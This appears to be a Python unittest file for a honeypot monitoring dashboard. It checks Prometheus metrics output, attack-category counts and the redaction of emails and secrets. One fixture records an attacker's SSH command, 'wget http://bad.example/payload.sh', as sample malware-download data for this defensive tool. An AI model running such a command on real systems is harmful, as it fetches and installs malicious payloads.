from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from honeypot_pipeline.dashboard import create_app
from honeypot_pipeline.storage.database import Database


class MetricsEndpointTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir = tempfile.TemporaryDirectory()
        self.records_path = Path(self.tmpdir.name) / "records.jsonl"
        self.records_path.touch()
        self.db_path = Path(self.tmpdir.name) / "metrics.db"
        self.app = create_app(records_path=self.records_path, db_path=self.db_path)
        self.client = self.app.test_client()

    def tearDown(self) -> None:
        self.tmpdir.cleanup()

    def _register_user(self, email: str, first_name: str) -> dict[str, str]:
        response = self.client.post(
            "/api/auth/register",
            json={
                "email": email,
                "password": "strong-password",
                "first_name": first_name,
                "cloud_provider": "aws",
            },
        )
        self.assertEqual(response.status_code, 201)
        return response.get_json()["user"]

    def test_metrics_returns_prometheus_text_and_summary_counts(self) -> None:
        db = Database(self.db_path)
        db.initialize()
        db.insert_event(
            {
                "timestamp": "2026-06-17T09:00:00Z",
                "event_type": "cowrie.command.input",
                "source_ip": "198.51.100.24",
                "protocol": "ssh",
                "session_id": "sess-1",
                "command": "wget http://bad.example/payload.sh",
                "raw_event": {"eventid": "cowrie.command.input"},
                "classification": {"attack_category": "malware_download", "severity": "high"},
                "threat_intel": {"score": {"is_malicious": True}},
                "risk": {"score": 90, "level": "critical", "reasons": ["download"]},
            }
        )
        db.close()

        response = self.client.get("/metrics")

        self.assertEqual(response.status_code, 200)
        self.assertIn("text/plain", response.content_type)
        text = response.get_data(as_text=True)
        self.assertIn("# TYPE honeypot_events_total gauge", text)
        self.assertIn("honeypot_events_total 1", text)
        self.assertIn("honeypot_malicious_events_total 1", text)
        self.assertIn('honeypot_attack_category_total{category="malware_download"} 1', text)
        self.assertIn('honeypot_protocol_total{protocol="ssh"} 1', text)
        self.assertIn('honeypot_risk_level_total{risk_level="critical"} 1', text)

    def test_metrics_include_multiple_users_with_opaque_user_ids(self) -> None:
        first = self._register_user("owner@example.com", "Owner")
        second = self._register_user("other@example.com", "Other")

        db = Database(self.db_path)
        db.initialize()
        device_one = db.create_device(user_id=first["user_id"], name="edge-a", provider="aws")
        device_two = db.create_device(user_id=second["user_id"], name="edge-b", provider="azure")
        db.record_heartbeat(
            device_one["token"],
            {
                "hostname": "edge-a",
                "ram_percent": 50.0,
                "disk_percent": 70.0,
                "load_1m": 0.75,
                "uptime_seconds": 120,
                "secret": "ignored",
            },
        )
        db.record_heartbeat(
            device_two["token"],
            {
                "hostname": "edge-b",
                "ram_percent": 25.0,
                "disk_percent": 30.0,
                "load_1m": 0.2,
                "uptime_seconds": 240,
            },
        )
        db.close()

        response = self.client.get("/metrics")
        text = response.get_data(as_text=True)

        self.assertIn(first["user_id"], text)
        self.assertIn(second["user_id"], text)
        self.assertNotIn("owner@example.com", text)
        self.assertNotIn("other@example.com", text)
        self.assertNotIn("secret", text)
        self.assertIn(
            f'honeypot_device_online{{device_id="{device_one["device_id"]}",provider="aws",user_id="{first["user_id"]}"}} 1',
            text,
        )
        self.assertIn(
            f'honeypot_device_ram_usage_percent{{device_id="{device_two["device_id"]}",provider="azure",user_id="{second["user_id"]}"}} 25.0',
            text,
        )


if __name__ == "__main__":
    unittest.main()
